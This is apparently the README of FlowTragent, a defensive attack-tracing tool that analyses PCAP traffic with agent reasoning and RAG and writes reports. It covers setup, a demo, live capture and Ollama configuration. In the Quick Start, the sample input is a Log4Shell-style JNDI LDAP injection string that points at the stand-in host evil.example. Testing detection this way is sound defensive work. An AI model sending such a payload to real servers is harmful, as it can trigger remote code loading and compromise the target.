# FlowTragent

FlowTragent is an automated attack tracing system built around traffic analysis and agent-assisted reasoning.

The project wraps NOVA-F as its core retrieval engine while keeping FlowTragent as an independent system with PCAP parsing, agent analysis, RAG knowledge support, and report generation.

## Current Layout

```text
FlowTragent/
├── libs/nova-f/
├── src/
│   ├── core/
│   ├── agent/
│   ├── parser/
│   ├── rag/
│   └── report/
├── data/
│   ├── pcap/
│   ├── csv/
│   └── index/
├── config/
├── reports/
├── tests/
├── requirements.txt
└── main.py
```

## Quick Start

```bash
cd ~/projects/FlowTragent
python3 -m venv flowtragent_env
source flowtragent_env/bin/activate
python -m pip install --upgrade pip setuptools wheel
python -m pip install -r requirements.txt
python tests/test_nova.py
python main.py --mode payload --input 'GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim' --demo-index
```

## PCAP Demo

```bash
source flowtragent_env/bin/activate
python tests/make_demo_pcap.py
python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index
ls -lh reports/
```

## Live Capture Flow

```bash
sudo apt update
sudo apt install -y tcpdump
sudo tcpdump -i eth0 -w /tmp/test.pcap
python main.py --mode pcap --input /tmp/test.pcap --output-dir ./reports
```

## Ollama

```bash
curl -fsSL https://ollama.com/install.sh | sh
ollama pull phi3:mini
OLLAMA_HOST=0.0.0.0:11434 ollama serve
curl http://127.0.0.1:11434/api/generate \
  -d '{"model":"phi3:mini","prompt":"Summarize Log4Shell in one sentence.","stream":false}'
```

## Common Fixes

```bash
# Missing venv support
sudo apt update
sudo apt install -y python3-venv python3-pip

# PCAP capture permission
sudo setcap cap_net_raw,cap_net_admin=eip "$(command -v tcpdump)"

# pip temporary directory has no space
mkdir -p ~/pip-tmp ~/pip-cache
TMPDIR=~/pip-tmp PIP_CACHE_DIR=~/pip-cache python -m pip install -r requirements.txt

# WSL cannot reach Ollama from Windows or another WSL distro
OLLAMA_HOST=0.0.0.0:11434 ollama serve
```
